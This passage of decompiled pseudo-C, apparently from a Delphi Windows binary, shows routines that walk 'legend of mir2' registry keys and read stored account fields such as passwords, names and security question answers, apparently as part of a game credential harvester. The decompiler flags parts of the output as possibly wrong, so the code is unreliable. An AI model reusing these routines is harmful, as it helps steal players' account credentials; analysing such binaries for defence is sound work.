        Delphi_Copy_40477C((int)v17, 1, (int)(v5 - 1), &v16);
      else
        sub_404304((volatile __int32 *)&v16, (__int32)v17);
      sub_403048(v12, v18);
      sub_4044C8(&v13, v12);
      sub_4045E4((volatile __int32 *)&v14, 3);
      v7 = sub_40471C(v14);
      sub_40E8D0(a1, v7, (const CHAR *)dword_40EDD8, &v15);
      if ( !v15 )
      {
        v8 = sub_40471C(v16);
        sub_40E710(a1, v18, v8);
      }
      sub_4047BC(&v17, 1, v6);
      --v4;
    }
    while ( v4 );
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_40EDB7;
  return sub_404290((int)&v13, 5);
}
// 40EDC8: using guessed type int dword_40EDC8[3];
// 40EDD8: using guessed type int dword_40EDD8[2];

//----- (0040EDE0) --------------------------------------------------------
int __usercall sub_40EDE0@<eax>(HKEY a1@<eax>, CHAR *a2@<edx>, __int32 a3@<ecx>)
{
  char v5; // zf
  _BYTE *v6; // eax
  int v7; // edi
  char *v8; // eax
  char *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  char *v13; // eax
  char *v14; // eax
  _BYTE *v15; // eax
  int v16; // edi
  char *v17; // eax
  char *v18; // eax
  char *v19; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char *v24; // eax
  char *v25; // eax
  char *v26; // eax
  char *v27; // eax
  char *v28; // eax
  char **v30; // [esp-14h] [ebp-200h]
  char **v31; // [esp-14h] [ebp-200h]
  char **v32; // [esp-14h] [ebp-200h]
  char **v33; // [esp-14h] [ebp-200h]
  unsigned int v34[2]; // [esp-Ch] [ebp-1F8h] BYREF
  int *v35; // [esp-4h] [ebp-1F0h]
  char *v36; // [esp+Ch] [ebp-1E0h] BYREF
  char *v37[2]; // [esp+10h] [ebp-1DCh] BYREF
  char **v38; // [esp+18h] [ebp-1D4h] BYREF
  char *v39; // [esp+1Ch] [ebp-1D0h] BYREF
  char **v40; // [esp+20h] [ebp-1CCh] BYREF
  char *v41; // [esp+24h] [ebp-1C8h] BYREF
  char *v42; // [esp+28h] [ebp-1C4h] BYREF
  char *v43; // [esp+2Ch] [ebp-1C0h] BYREF
  char *v44; // [esp+30h] [ebp-1BCh] BYREF
  char *v45; // [esp+34h] [ebp-1B8h] BYREF
  char *v46; // [esp+38h] [ebp-1B4h] BYREF
  char *v47; // [esp+3Ch] [ebp-1B0h] BYREF
  char *v48; // [esp+40h] [ebp-1ACh] BYREF
  char *v49; // [esp+44h] [ebp-1A8h] BYREF
  char *v50; // [esp+48h] [ebp-1A4h] BYREF
  char *v51; // [esp+4Ch] [ebp-1A0h] BYREF
  char *v52; // [esp+50h] [ebp-19Ch] BYREF
  char *v53; // [esp+54h] [ebp-198h] BYREF
  char *v54; // [esp+58h] [ebp-194h] BYREF
  char *v55; // [esp+5Ch] [ebp-190h] BYREF
  char *v56; // [esp+60h] [ebp-18Ch] BYREF
  char *v57; // [esp+64h] [ebp-188h] BYREF
  char *v58; // [esp+68h] [ebp-184h] BYREF
  char *v59; // [esp+6Ch] [ebp-180h] BYREF
  char *v60; // [esp+70h] [ebp-17Ch] BYREF
  char *v61; // [esp+74h] [ebp-178h] BYREF
  char *v62; // [esp+78h] [ebp-174h] BYREF
  char *v63; // [esp+7Ch] [ebp-170h] BYREF
  char *v64; // [esp+80h] [ebp-16Ch] BYREF
  char *v65; // [esp+84h] [ebp-168h] BYREF
  char *v66; // [esp+88h] [ebp-164h] BYREF
  char *v67; // [esp+8Ch] [ebp-160h] BYREF
  char *v68; // [esp+90h] [ebp-15Ch] BYREF
  char *v69[2]; // [esp+94h] [ebp-158h] BYREF
  char **v70; // [esp+9Ch] [ebp-150h] BYREF
  char *v71; // [esp+A0h] [ebp-14Ch] BYREF
  char **v72; // [esp+A4h] [ebp-148h] BYREF
  char *v73; // [esp+A8h] [ebp-144h] BYREF
  char *v74; // [esp+ACh] [ebp-140h] BYREF
  char *v75; // [esp+B0h] [ebp-13Ch] BYREF
  char *v76; // [esp+B4h] [ebp-138h] BYREF
  char *v77; // [esp+B8h] [ebp-134h] BYREF
  char *v78; // [esp+BCh] [ebp-130h] BYREF
  char *v79; // [esp+C0h] [ebp-12Ch] BYREF
  char *v80; // [esp+C4h] [ebp-128h] BYREF
  char *v81; // [esp+C8h] [ebp-124h] BYREF
  char v82[256]; // [esp+CCh] [ebp-120h] BYREF
  char *v83; // [esp+1CCh] [ebp-20h] BYREF
  char *v84; // [esp+1D0h] [ebp-1Ch] BYREF
  char *v85; // [esp+1D4h] [ebp-18h] BYREF
  int v86; // [esp+1D8h] [ebp-14h]
  int v87; // [esp+1DCh] [ebp-10h]
  char *v88; // [esp+1E0h] [ebp-Ch] BYREF
  char *v89; // [esp+1E4h] [ebp-8h] BYREF
  __int32 v90; // [esp+1E8h] [ebp-4h] BYREF
  int savedregs; // [esp+1ECh] [ebp+0h] BYREF

  v90 = _InterlockedExchange(&v90, a3);
  sub_40470C(v90);
  v35 = &savedregs;
  v34[1] = (unsigned int)&loc_40F642;
  v34[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v34);
  v87 = sub_40EA60(a1, a2, (volatile __int32 *)&v89);
  if ( v87 > 0 )
  {
    Delphi_CompareCall_404668(v90, (int *)"Change password");
    if ( v5 && v87 > 0 )
    {
      v86 = v87;
      do
      {
        v6 = sub_404804(dword_40F670, v89);
        v7 = (int)v6;
        if ( v6 )
          Delphi_Copy_40477C((int)v89, 1, (int)(v6 - 1), &v88);
        else
          sub_404304((volatile __int32 *)&v88, (__int32)v89);
        sub_403048(v82, a2);
        sub_4044C8(&v83, v82);
        sub_4045E4((volatile __int32 *)&v84, 3);
        v8 = sub_40471C(v84);
        sub_40E8D0(a1, v8, (const CHAR *)&dword_40F680, &v85);
        if ( !v85 )
          goto LABEL_13;
        sub_403048(v82, a2);
        sub_4044C8(&v79, v82);
        sub_4045E4((volatile __int32 *)&v80, 3);
        v9 = sub_40471C(v80);
        sub_40E8D0(a1, v9, (const CHAR *)&dword_40F684, &v81);
        if ( !v81 )
          goto LABEL_13;
        sub_403048(v82, a2);
        sub_4044C8(&v76, v82);
        sub_4045E4((volatile __int32 *)&v77, 3);
        v10 = sub_40471C(v77);
        sub_40E8D0(a1, v10, (const CHAR *)&dword_40F688, &v78);
        if ( !v78 )
          goto LABEL_13;
        sub_403048(v82, a2);
        sub_4044C8(&v73, v82);
        sub_4045E4((volatile __int32 *)&v74, 3);
        v11 = sub_40471C(v74);
        sub_40E8D0(a1, v11, (const CHAR *)dword_40F68C, &v75);
        if ( !v75 )
          goto LABEL_13;
        sub_403048(v82, a2);
        sub_4044C8((char **)&v70, v82);
        v30 = v70;
        sub_4045E4((volatile __int32 *)&v71, 3);
        v12 = sub_40471C(v71);
        sub_40E8D0(a1, v12, (const CHAR *)&dword_40F688, v30);
        v31 = v72;
        sub_403048(v82, a2);
        sub_4044C8(&v68, v82);
        sub_4045E4((volatile __int32 *)v69, 3);
        v13 = sub_40471C(v69[0]);
        sub_40E8D0(a1, v13, (const CHAR *)dword_40F68C, v31);
        Delphi_CompareCall_404668((int)&v72, (int *)v69[1]);
        if ( !v5 )
        {
LABEL_13:
          v14 = sub_40471C(v88);
          sub_40E710(a1, a2, v14);
        }
        sub_4047BC(&v89, 1, v7);
        --v86;
      }
      while ( v86 );
    }
    Delphi_CompareCall_404668(v90, (int *)"Registry");
    if ( v5 && v87 > 0 )
    {
      v86 = v87;
      do
      {
        v15 = sub_404804(dword_40F670, v89);
        v16 = (int)v15;
        if ( v15 )
          Delphi_Copy_40477C((int)v89, 1, (int)(v15 - 1), &v88);
        else
          sub_404304((volatile __int32 *)&v88, (__int32)v89);
        sub_403048(v82, a2);
        sub_4044C8(&v65, v82);
        sub_4045E4((volatile __int32 *)&v66, 3);
        v17 = sub_40471C(v66);
        sub_40E8D0(a1, v17, (const CHAR *)&dword_40F680, &v67);
        if ( !v67 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8(&v62, v82);
        sub_4045E4((volatile __int32 *)&v63, 3);
        v18 = sub_40471C(v63);
        sub_40E8D0(a1, v18, "PW", &v64);
        if ( !v64 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8(&v59, v82);
        sub_4045E4((volatile __int32 *)&v60, 3);
        v19 = sub_40471C(v60);
        sub_40E8D0(a1, v19, (const CHAR *)dword_40F68C, &v61);
        if ( !v61 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8(&v56, v82);
        sub_4045E4((volatile __int32 *)&v57, 3);
        v20 = sub_40471C(v57);
        sub_40E8D0(a1, v20, "NA", &v58);
        if ( !v58 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8(&v53, v82);
        sub_4045E4((volatile __int32 *)&v54, 3);
        v21 = sub_40471C(v54);
        sub_40E8D0(a1, v21, "BI", &v55);
        if ( !v55 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8(&v50, v82);
        sub_4045E4((volatile __int32 *)&v51, 3);
        v22 = sub_40471C(v51);
        sub_40E8D0(a1, v22, "Q1", &v52);
        if ( !v52 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8(&v47, v82);
        sub_4045E4((volatile __int32 *)&v48, 3);
        v23 = sub_40471C(v48);
        sub_40E8D0(a1, v23, "A1", &v49);
        if ( !v49 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8(&v44, v82);
        sub_4045E4((volatile __int32 *)&v45, 3);
        v24 = sub_40471C(v45);
        sub_40E8D0(a1, v24, "Q2", &v46);
        if ( !v46 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8(&v41, v82);
        sub_4045E4((volatile __int32 *)&v42, 3);
        v25 = sub_40471C(v42);
        sub_40E8D0(a1, v25, "A2", &v43);
        if ( !v43 )
          goto LABEL_31;
        sub_403048(v82, a2);
        sub_4044C8((char **)&v38, v82);
        v32 = v38;
        sub_4045E4((volatile __int32 *)&v39, 3);
        v26 = sub_40471C(v39);
        sub_40E8D0(a1, v26, "PW", v32);
        v33 = v40;
        sub_403048(v82, a2);
        sub_4044C8(&v36, v82);
        sub_4045E4((volatile __int32 *)v37, 3);
        v27 = sub_40471C(v37[0]);
        sub_40E8D0(a1, v27, (const CHAR *)dword_40F68C, v33);
        Delphi_CompareCall_404668((int)&v40, (int *)v37[1]);
        if ( !v5 )
        {
LABEL_31:
          v28 = sub_40471C(v88);
          sub_40E710(a1, a2, v28);
        }
        sub_4047BC(&v89, 1, v16);
        --v86;
      }
      while ( v86 );
    }
  }
  __writefsdword(0, v34[0]);
  v35 = (int *)&loc_40F649;
  sub_404290((int)&v36, 48);
  sub_404290((int)&v83, 3);
  return sub_404290((int)&v88, 3);
}
// 40EE3A: variable 'v5' is possibly undefined
// 40F670: using guessed type int dword_40F670[3];
// 40F680: using guessed type int dword_40F680;
// 40F684: using guessed type int dword_40F684;
// 40F688: using guessed type int dword_40F688;
// 40F68C: using guessed type int dword_40F68C[3];

//----- (0040F6C0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_40F6C0@<eax>(volatile __int32 *a1@<eax>, int a2@<ebx>)
{
  _DWORD v4[4]; // [esp-10h] [ebp-30h] BYREF
  char *v5; // [esp+0h] [ebp-20h] BYREF
  char *v6; // [esp+4h] [ebp-1Ch] BYREF
  char *v7; // [esp+8h] [ebp-18h] BYREF
  char *v8; // [esp+Ch] [ebp-14h] BYREF
  char *v9; // [esp+10h] [ebp-10h] BYREF
  char *v10; // [esp+14h] [ebp-Ch] BYREF
  char *v11; // [esp+18h] [ebp-8h] BYREF
  __int32 v12; // [esp+1Ch] [ebp-4h] BYREF
  void *savedregs; // [esp+20h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = 0;
  v7 = 0;
  v6 = 0;
  v5 = 0;
  v4[3] = a2;
  v4[2] = &savedregs;
  v4[1] = &loc_40F81B;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_40426C(&v12);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)&dword_40F838, &v11);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_40F868, &v10);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_40F87C, &v9);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_40F890, &v8);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_40F8A4, &v7);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)dword_40F8B8, &v6);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", (const CHAR *)&dword_40F8CC, &v5);
  sub_4045E4(&v12, 21);
  sub_4042C0(a1, v12);
  __writefsdword(0, (unsigned int)v11);
  savedregs = &loc_40F822;
  return sub_404290((int)&v5, 8);
}
// 40F6C0: could not find valid save-restore pair for ebx
// 40F815: bad sp value at call
// 40F838: using guessed type int dword_40F838;
// 40F868: using guessed type int dword_40F868[3];
// 40F87C: using guessed type int dword_40F87C[3];
// 40F890: using guessed type int dword_40F890[3];
// 40F8A4: using guessed type int dword_40F8A4[3];
// 40F8B8: using guessed type int[3];
// 40F8CC: using guessed type int dword_40F8CC;

//----- (0040F8D0) --------------------------------------------------------
int __usercall sub_40F8D0@<eax>(volatile __int32 *a1@<eax>, char a2@<dl>, __int32 a3@<ecx>)
{
  signed int v4; // ebx
  signed int v5; // esi
  _BYTE *v6; // eax
  int v7; // ebx
  char *v8; // eax
  int v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  char *v13; // eax
  char *v14; // eax
  char *v15; // eax
  char *v16; // eax
  char *v17; // eax
  char *v18; // eax
  char *v19; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char *v24; // eax
  char *v25; // eax
  char *v26; // eax
  signed int v27; // ebx
  signed int v28; // esi
  _BYTE *v29; // eax
  int v30; // ebx
  char *v31; // eax
  int v32; // eax
  char *v33; // eax
  char *v34; // eax
  char *v35; // eax
  char *v36; // eax
  signed int v37; // ebx
  signed int v38; // esi
  _BYTE *v39; // eax
  int v40; // ebx
  char *v41; // eax
  char *v42; // eax
  char *v43; // eax
  char *v44; // eax
  char *v45; // eax
  char *v46; // eax
  char *v47; // eax
  char *v48; // eax
  char *v49; // eax
  char *v50; // eax
  char *v51; // eax
  char *v52; // eax
  char *v53; // eax
  char v54; // zf
  char *ExceptionList; // [esp-Ch] [ebp-1C4h] BYREF
  int *v57; // [esp-8h] [ebp-1C0h]
  char *v58; // [esp-4h] [ebp-1BCh]
  char *v59; // [esp+Ch] [ebp-1ACh] BYREF
  char *v60; // [esp+10h] [ebp-1A8h] BYREF
  char *v61; // [esp+14h] [ebp-1A4h] BYREF
  char *v62; // [esp+18h] [ebp-1A0h] BYREF
  char *v63; // [esp+1Ch] [ebp-19Ch] BYREF
  char *v64; // [esp+20h] [ebp-198h] BYREF
  char *v65; // [esp+24h] [ebp-194h] BYREF
  char *v66; // [esp+28h] [ebp-190h] BYREF
  char *v67; // [esp+2Ch] [ebp-18Ch] BYREF
  char *v68; // [esp+30h] [ebp-188h] BYREF
  char *v69; // [esp+34h] [ebp-184h] BYREF
  char *v70; // [esp+38h] [ebp-180h] BYREF
  char *v71; // [esp+3Ch] [ebp-17Ch] BYREF
  char *v72; // [esp+40h] [ebp-178h] BYREF
  char *v73; // [esp+44h] [ebp-174h] BYREF
  char *v74; // [esp+48h] [ebp-170h] BYREF
  char *v75; // [esp+4Ch] [ebp-16Ch] BYREF
  char *v76; // [esp+50h] [ebp-168h] BYREF
  char *v77; // [esp+54h] [ebp-164h] BYREF
  char *v78; // [esp+58h] [ebp-160h] BYREF
  char *v79; // [esp+5Ch] [ebp-15Ch] BYREF
  char *v80; // [esp+60h] [ebp-158h] BYREF
  char *v81; // [esp+64h] [ebp-154h] BYREF
  char *v82; // [esp+68h] [ebp-150h] BYREF
  char *v83; // [esp+6Ch] [ebp-14Ch] BYREF
  char *v84; // [esp+70h] [ebp-148h] BYREF
  char *v85; // [esp+74h] [ebp-144h] BYREF
  char *v86; // [esp+78h] [ebp-140h] BYREF
  char *v87; // [esp+7Ch] [ebp-13Ch] BYREF
  char *v88; // [esp+80h] [ebp-138h] BYREF
  char *v89; // [esp+84h] [ebp-134h] BYREF
  char *v90; // [esp+88h] [ebp-130h] BYREF
  char *v91; // [esp+8Ch] [ebp-12Ch] BYREF
  char *v92; // [esp+90h] [ebp-128h] BYREF
  char *v93; // [esp+94h] [ebp-124h] BYREF
  char *v94; // [esp+98h] [ebp-120h] BYREF
  char *v95; // [esp+9Ch] [ebp-11Ch] BYREF
  char *v96; // [esp+A0h] [ebp-118h] BYREF
  char *v97; // [esp+A4h] [ebp-114h] BYREF
  char *v98; // [esp+A8h] [ebp-110h] BYREF
  char *v99; // [esp+ACh] [ebp-10Ch] BYREF
  char *v100; // [esp+B0h] [ebp-108h] BYREF
  char *v101; // [esp+B4h] [ebp-104h] BYREF
  char *v102; // [esp+B8h] [ebp-100h] BYREF
  char *v103; // [esp+BCh] [ebp-FCh] BYREF
  char *v104; // [esp+C0h] [ebp-F8h] BYREF
  char *v105; // [esp+C4h] [ebp-F4h] BYREF
  char *v106; // [esp+C8h] [ebp-F0h] BYREF
  char *v107; // [esp+CCh] [ebp-ECh] BYREF
  char *v108; // [esp+D0h] [ebp-E8h] BYREF
  char *v109; // [esp+D4h] [ebp-E4h] BYREF
  char *v110; // [esp+D8h] [ebp-E0h] BYREF
  char *v111; // [esp+DCh] [ebp-DCh] BYREF
  char *v112; // [esp+E0h] [ebp-D8h] BYREF
  char *v113; // [esp+E4h] [ebp-D4h] BYREF
  char *v114; // [esp+E8h] [ebp-D0h] BYREF
  char *v115; // [esp+ECh] [ebp-CCh] BYREF
  char *v116; // [esp+F0h] [ebp-C8h] BYREF
  char *v117; // [esp+F4h] [ebp-C4h] BYREF
  char *v118; // [esp+F8h] [ebp-C0h] BYREF
  char *v119; // [esp+FCh] [ebp-BCh] BYREF
  char *v120; // [esp+100h] [ebp-B8h] BYREF
  char *v121; // [esp+104h] [ebp-B4h] BYREF
  char *v122; // [esp+108h] [ebp-B0h] BYREF
  __int32 v123; // [esp+10Ch] [ebp-ACh] BYREF
  char *v124; // [esp+110h] [ebp-A8h] BYREF
  char *v125; // [esp+114h] [ebp-A4h] BYREF
  char *v126; // [esp+118h] [ebp-A0h] BYREF
  char *v127; // [esp+11Ch] [ebp-9Ch] BYREF
  char *v128; // [esp+120h] [ebp-98h] BYREF
  char *v129; // [esp+124h] [ebp-94h] BYREF
  char *v130; // [esp+128h] [ebp-90h] BYREF
  char *v131; // [esp+12Ch] [ebp-8Ch] BYREF
  char *v132; // [esp+130h] [ebp-88h] BYREF
  char *v133; // [esp+134h] [ebp-84h] BYREF
  char *v134; // [esp+138h] [ebp-80h] BYREF
  char *v135; // [esp+13Ch] [ebp-7Ch] BYREF
  char *v136; // [esp+140h] [ebp-78h] BYREF
  char *v137; // [esp+144h] [ebp-74h] BYREF
  char *v138; // [esp+148h] [ebp-70h] BYREF
  char *v139; // [esp+14Ch] [ebp-6Ch] BYREF
  char *v140; // [esp+150h] [ebp-68h] BYREF
  char *v141; // [esp+154h] [ebp-64h] BYREF
  char *v142; // [esp+158h] [ebp-60h] BYREF
  char *v143; // [esp+15Ch] [ebp-5Ch] BYREF
  char *v144; // [esp+160h] [ebp-58h] BYREF
  char *v145; // [esp+164h] [ebp-54h] BYREF
  char *v146; // [esp+168h] [ebp-50h] BYREF
  char *v147; // [esp+16Ch] [ebp-4Ch] BYREF
  char *v148; // [esp+170h] [ebp-48h] BYREF
  char *v149; // [esp+174h] [ebp-44h] BYREF
  char *v150; // [esp+178h] [ebp-40h] BYREF
  char *v151; // [esp+17Ch] [ebp-3Ch] BYREF
  char *v152; // [esp+180h] [ebp-38h] BYREF
  char *v153; // [esp+184h] [ebp-34h] BYREF
  char *v154; // [esp+188h] [ebp-30h] BYREF
  char *v155; // [esp+18Ch] [ebp-2Ch] BYREF
  char *v156; // [esp+190h] [ebp-28h] BYREF
  char *v157; // [esp+194h] [ebp-24h] BYREF
  char v158; // [esp+19Bh] [ebp-1Dh]
  char *v159; // [esp+19Ch] [ebp-1Ch] BYREF
  char *v160; // [esp+1A0h] [ebp-18h] BYREF
  char *v161; // [esp+1A4h] [ebp-14h] BYREF
  char *v162; // [esp+1A8h] [ebp-10h] BYREF
  char *v163; // [esp+1ACh] [ebp-Ch] BYREF
  volatile __int32 *v164; // [esp+1B0h] [ebp-8h]
  __int32 v165; // [esp+1B4h] [ebp-4h] BYREF
  int savedregs; // [esp+1B8h] [ebp+0h] BYREF

  v164 = (volatile __int32 *)_InterlockedExchange(&v165, a3);
  HIBYTE(v165) = a2;
  v58 = (char *)&savedregs;
  v57 = (int *)&loc_410B3C;
  ExceptionList = (char *)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v158 = 0;
  sub_40426C(&v163);
  v4 = sub_40EA60(HKEY_CLASSES_ROOT, "legend of mir2\\Enter", (volatile __int32 *)&v163);
  if ( v4 )
  {
    v158 = 1;
    sub_40E348(*off_42B94C, &v156);
    sub_4045E4(a1, 4);
    sub_40E348(*off_42B94C, &v155);
    sub_40452C(&v161, (__int32)v155);
    v5 = v4;
    if ( v4 > 0 )
    {
      do
      {
        v6 = sub_404804(dword_410BA0, v163);
        v7 = (int)v6;
        if ( v6 )
          Delphi_Copy_40477C((int)v163, 1, (int)(v6 - 1), &v162);
        else
          sub_404304((volatile __int32 *)&v162, (__int32)v163);
        sub_404570((volatile __int32 *)&v154, "legend of mir2\\Enter\\", v162);
        v8 = sub_40471C(v154);
        sub_40E8D0(HKEY_CLASSES_ROOT, v8, "PW", &v157);
        sub_40E348((int)sub_410BD0, &v153);
        if ( (int)sub_404804(v153, (_BYTE *)*off_42B9AC) <= 0 && !HIBYTE(v165) )
        {
          v9 = sub_404524((int)v157);
          sub_4047BC(&v157, v9 - 3 + 1, 3);
          sub_40452C(&v157, (__int32)dword_410BF4);
        }
        sub_404570((volatile __int32 *)&v151, "legend of mir2\\Enter\\", v162);
        v10 = sub_40471C(v151);
        sub_40E8D0(HKEY_CLASSES_ROOT, v10, (const CHAR *)dword_410C08, &v152);
        sub_404570((volatile __int32 *)&v149, "legend of mir2\\Enter\\", v162);
        v11 = sub_40471C(v149);
        sub_40E8D0(HKEY_CLASSES_ROOT, v11, (const CHAR *)dword_410C20, &v150);
        sub_404570((volatile __int32 *)&v147, "legend of mir2\\Enter\\", v162);
        v12 = sub_40471C(v147);
        sub_40E8D0(HKEY_CLASSES_ROOT, v12, (const CHAR *)&dword_410C44, &v148);
        sub_4045E4((volatile __int32 *)&v160, 14);
        sub_404570((volatile __int32 *)&v146, "legend of mir2\\Enter\\", v162);
        v13 = sub_40471C(v146);
        if ( (unsigned __int8)sub_40E944("JsN1", HKEY_CLASSES_ROOT, v13, v7) )
        {
          sub_404570((volatile __int32 *)&v145, "legend of mir2\\Enter\\", v162);
          v14 = sub_40471C(v145);
          if ( (unsigned __int8)sub_40E944("JsD1", HKEY_CLASSES_ROOT, v14, v7) )
          {
            sub_404570((volatile __int32 *)&v143, "legend of mir2\\Enter\\", v162);
            v15 = sub_40471C(v143);
            sub_40E8D0(HKEY_CLASSES_ROOT, v15, "JsN1", &v144);
            sub_404570((volatile __int32 *)&v141, "legend of mir2\\Enter\\", v162);
            v16 = sub_40471C(v141);
            sub_40E8D0(HKEY_CLASSES_ROOT, v16, "JsZ1", &v142);
            sub_404570((volatile __int32 *)&v139, "legend of mir2\\Enter\\", v162);
            v17 = sub_40471C(v139);
            sub_40E8D0(HKEY_CLASSES_ROOT, v17, "JsD1", &v140);
            sub_404570((volatile __int32 *)&v137, "legend of mir2\\Enter\\", v162);
            v18 = sub_40471C(v137);
            sub_40E8D0(HKEY_CLASSES_ROOT, v18, "JsS1", &v138);
            sub_4045E4((volatile __int32 *)&v160, 13);
          }
        }
        sub_404570((volatile __int32 *)&v136, "legend of mir2\\Enter\\", v162);
        v19 = sub_40471C(v136);
        if ( (unsigned __int8)sub_40E944("JsN2", HKEY_CLASSES_ROOT, v19, v7) )
        {
          sub_404570((volatile __int32 *)&v135, "legend of mir2\\Enter\\", v162);
          v20 = sub_40471C(v135);
          if ( (unsigned __int8)sub_40E944("JsD2", HKEY_CLASSES_ROOT, v20, v7) )
          {
            sub_404570((volatile __int32 *)&v133, "legend of mir2\\Enter\\", v162);
            v21 = sub_40471C(v133);
            sub_40E8D0(HKEY_CLASSES_ROOT, v21, "JsN2", &v134);
            sub_404570((volatile __int32 *)&v131, "legend of mir2\\Enter\\", v162);
            v22 = sub_40471C(v131);
            sub_40E8D0(HKEY_CLASSES_ROOT, v22, "JsZ2", &v132);
            sub_404570((volatile __int32 *)&v129, "legend of mir2\\Enter\\", v162);
            v23 = sub_40471C(v129);
            sub_40E8D0(HKEY_CLASSES_ROOT, v23, "JsD2", &v130);
            sub_404570((volatile __int32 *)&v127, "legend of mir2\\Enter\\", v162);
            v24 = sub_40471C(v127);
            sub_40E8D0(HKEY_CLASSES_ROOT, v24, "JsS2", &v128);
            sub_4045E4((volatile __int32 *)&v160, 14);
          }
        }
        sub_404570((volatile __int32 *)&v126, "legend of mir2\\Enter\\", v162);
        v25 = sub_40471C(v126);
        if ( (unsigned __int8)sub_40E944("ZB", HKEY_CLASSES_ROOT, v25, v7) )
        {
          sub_40452C(&v161, (__int32)dword_410D28);
          if ( byte_42CA20 )
          {
            sub_40F6C0(&v123, v7);
          }
          else
          {
            sub_404570((volatile __int32 *)&v124, "legend of mir2\\Enter\\", v162);
            v26 = sub_40471C(v124);
            sub_40E8D0(HKEY_CLASSES_ROOT, v26, "ZB", &v125);
          }
          sub_4045E4((volatile __int32 *)&v160, 4);
        }
        sub_40452C(&v160, (__int32)dword_410B6C);
        sub_4047BC(&v163, 1, v7);
        --v5;
      }
      while ( v5 );
    }
    sub_40452C((char **)a1, (__int32)v160);
  }
  sub_40426C(&v163);
  sub_40426C(&v160);
  v27 = sub_40EA60(HKEY_CLASSES_ROOT, "legend of mir2\\Change password", (volatile __int32 *)&v163);
  if ( v27 )
  {
    v158 = 1;
    sub_40E348(*off_42B95C, &v122);
    sub_4045E4(a1, 5);
    sub_40E348(*off_42B95C, &v121);
    sub_40452C(&v161, (__int32)v121);
    v28 = v27;
    if ( v27 > 0 )
    {
      do
      {
        v29 = sub_404804(dword_410BA0, v163);
        v30 = (int)v29;
        if ( v29 )
          Delphi_Copy_40477C((int)v163, 1, (int)(v29 - 1), &v162);
        else
          sub_404304((volatile __int32 *)&v162, (__int32)v163);
        sub_404570((volatile __int32 *)&v120, "legend of mir2\\Change password\\", v162);
        v31 = sub_40471C(v120);
        sub_40E8D0(HKEY_CLASSES_ROOT, v31, "NP", &v157);
        sub_40E348((int)sub_410BD0, &v119);
        if ( (int)sub_404804(v119, (_BYTE *)*off_42B9AC) <= 0 && !HIBYTE(v165) )
        {
          v32 = sub_404524((int)v157);
          sub_4047BC(&v157, v32 - 3 + 1, 3);
          sub_40452C(&v157, (__int32)dword_410BF4);
        }
        sub_404570((volatile __int32 *)&v117, "legend of mir2\\Change password\\", v162);
        v33 = sub_40471C(v117);
        sub_40E8D0(HKEY_CLASSES_ROOT, v33, (const CHAR *)dword_410C08, &v118);
        sub_404570((volatile __int32 *)&v115, "legend of mir2\\Change password\\", v162);
        v34 = sub_40471C(v115);
        sub_40E8D0(HKEY_CLASSES_ROOT, v34, (const CHAR *)dword_410C20, &v116);
        sub_404570((volatile __int32 *)&v113, "legend of mir2\\Change password\\", v162);
        v35 = sub_40471C(v113);
        sub_40E8D0(HKEY_CLASSES_ROOT, v35, (const CHAR *)dword_410DB0, &v114);
        sub_404570((volatile __int32 *)&v111, "legend of mir2\\Change password\\", v162);
        v36 = sub_40471C(v111);
        sub_40E8D0(HKEY_CLASSES_ROOT, v36, (const CHAR *)&dword_410DD4, &v112);
        sub_4045E4((volatile __int32 *)&v160, 17);
        sub_4047BC(&v163, 1, v30);
        --v28;
      }
      while ( v28 );
    }
    sub_40452C((char **)a1, (__int32)v160);
  }
  sub_40426C(&v163);
  sub_40426C(&v160);
  v37 = sub_40EA60(HKEY_CLASSES_ROOT, "legend of mir2\\Registry", (volatile __int32 *)&v163);
  if ( v37 )
  {
    v158 = 1;
    sub_40E348(*off_42B860[0], &v110);
    sub_4045E4(a1, 5);
    sub_40E348(*off_42B860[0], &v109);
    sub_40452C(&v161, (__int32)v109);
    v38 = v37;
    if ( v37 > 0 )
    {
      do
      {
        v39 = sub_404804(dword_410BA0, v163);
        v40 = (int)v39;
        if ( v39 )
          Delphi_Copy_40477C((int)v163, 1, (int)(v39 - 1), &v162);
        else
          sub_404304((volatile __int32 *)&v162, (__int32)v163);
        sub_404570((volatile __int32 *)&v107, "legend of mir2\\Registry\\", v162);
        v41 = sub_40471C(v107);
        sub_40E8D0(HKEY_CLASSES_ROOT, v41, (const CHAR *)dword_410C08, &v108);
        sub_404570((volatile __int32 *)&v105, "legend of mir2\\Registry\\", v162);
        v42 = sub_40471C(v105);
        sub_40E8D0(HKEY_CLASSES_ROOT, v42, (const CHAR *)dword_410C20, &v106);
        sub_404570((volatile __int32 *)&v103, "legend of mir2\\Registry\\", v162);
        v43 = sub_40471C(v103);
        sub_40E8D0(HKEY_CLASSES_ROOT, v43, "PW", &v104);
